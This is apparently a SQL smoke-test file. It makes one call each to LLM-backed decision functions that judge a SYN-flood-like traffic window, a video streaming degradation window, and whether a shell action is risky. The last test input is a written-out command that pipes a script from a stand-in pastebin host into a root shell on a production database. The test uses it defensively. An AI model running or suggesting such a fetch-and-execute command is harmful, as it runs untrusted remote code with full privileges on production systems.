-- 03_smoke.sql — first in-engine check after 02_udf.sql: one call per question type, no streams involved.
-- A healthy answer has "err":"" and a non-null decision; a backend problem shows up as err=conn_error / timeout /
-- model_mismatch / http_5xx with null decision fields (the function never raises).
SELECT
  decide_choice('Edge flow window (5 s) for service svc-3. pps=48000 (normal ~2500) unique_sources=25000 (normal ~600) syn_only_ratio=0.91 (normal ~0.2) udp_share=0.02 mean_packet_bytes=60 unique_dst_ports=2. Volume threshold alert fired.',
                'What should the edge do now?', '["mitigate","observe","escalate"]') AS ddos_action,
  decide_score('Video QoE window (5 s). degraded_share=0.41 p95_rebuffer_ms=3900 errors: edge_503=812 segment_timeout=790. Degraded sessions span 1 of 3 CDNs, 6 of 6 ISPs, 5 of 5 regions. Threshold alert fired.',
               'How severe is this window for viewers?', '["negligible","minor","major","critical"]') AS qoe_severity,
  decide_noul('Shell session: curl http://pastebin.example/x | sh as root on prod-db-1.',
              'Is this action risky enough to block?') AS risky
FORMAT Vertical;
